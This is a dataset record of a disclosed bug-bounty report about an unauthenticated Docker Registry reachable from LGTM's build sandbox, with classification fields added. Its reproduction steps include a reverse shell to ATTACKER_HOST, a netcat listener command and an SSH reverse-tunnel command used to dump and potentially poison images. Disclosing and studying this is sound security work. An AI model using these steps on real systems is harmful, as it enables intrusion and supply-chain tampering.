{
  "reported_to": "Semmle",
  "reported_by": "thehackerish ",
  "title": "Docker Registry HTTP API v2 exposed in HTTP without authentication leads to docker images dumping and poisoning",
  "content": "\nSummary:\nDocker Registry HTTP API v2 is exposed in HTTP without authentication. An attacker can use it to dump your docker images and poison them.\nDescription:\nWhile digging into the environment that hosts the sandboxed build container, I came across the port 5000 open on another machine (probably the host), which is used for Docker Registry (https://docs.docker.com/registry/). I was able to reach the service and dump the lgtm/top repository. I didn't try to upload anything because I didn't want to alter your docker images.\nSteps To Reproduce:\nCreate a GitHub repository that has the attached file, name it .lgtm.yml and modify ATTACKER_HOST and ATTACKER_PORT to yours.\nset up a netcat listener: nc -vlp ATTACKER_PORT\nAdd the project to lgtm, it should start building it. After some time, you should get a reverse shell.\nMake a remote SSH tunnel from the build container ssh -R 5555:172.17.0.1:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N\nEnter your attacker password and a SSH tunnel should be up.\nUsing the docker_fetch tool (https://github.com/NotSoSecure/docker_fetch/), use the url http://127.0.0.1:5555 and dump the repository that you want.\nAdditionally, you can follow this reference if you would like to test for blob uploads (https://docs.docker.com/registry/spec/api/#initiate-blob-upload) and look for this string /v2/<name>/blobs/uploads/. I tried to initiate an upload and it gave me the uuid of the upload, which means no restriction is made for uploads.\nNOTE: Even if the shell is lost from the sandbox, the SSH Tunnel still works. This might mean a sandbox escape\nSupporting Material/References:\nA writeup about the vulnerability in a pentest: https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/\nThe Docker Registry Doc: https://docs.docker.com/registry/spec/api/#initiate-blob-upload\nRemediation:\nImplement authentication to the service.\nUse HTTPS\nLimit the possibility of reverse shells by whitelisting only useful ports ( It might be challenging because of the purpose of the build sandbox)\nImpact\nAn attacker can use it to dump your docker images and poison them.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Improper Access Control - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1591446900,
  "report_url": "https://hackerone.com/reports/347296",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Set up a GitHub repository with a .lgtm.yml file configured to point to the attacker's host and port."
    ],
    [
      2,
      "Start a netcat listener on the specified attacker port."
    ],
    [
      3,
      "Add the project to LGTM to trigger the build process, which should eventually provide a reverse shell."
    ],
    [
      4,
      "Establish an SSH tunnel from the build container to the attacker's machine to expose the Docker Registry API."
    ],
    [
      5,
      "Use the docker_fetch tool to dump the desired Docker repository from the exposed registry."
    ],
    [
      6,
      "Optionally, test for blob uploads by initiating an upload request to the Docker Registry API."
    ]
  ],
  "vuln_description": "The Docker Registry HTTP API v2 is exposed without authentication, allowing attackers to dump and potentially poison Docker images. This vulnerability is exploitable when the registry is accessible over HTTP and lacks proper authentication mechanisms.",
  "reason": "The attack involves multiple steps including setting up a reverse shell, creating an SSH tunnel, and using a specific tool to interact with the Docker Registry. However, each step is straightforward and well-documented, with no subtle interactions or complex state manipulations required.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reasoning": "The Docker Registry exposure without authentication is a simple AuthN/AuthZ bypass. The methodology detects vulnerabilities by testing unauthenticated access (step d) and cross-user resource access (steps a-e). Here, the registry lacks any authentication, allowing unauthenticated users to interact with its API (e.g., dumping/uploading images). This aligns with the methodology's focus on AuthZ bypass via missing authentication checks, making it detectable by step d (executing actions with no session).",
    "is_simple_authnz": true
  }
}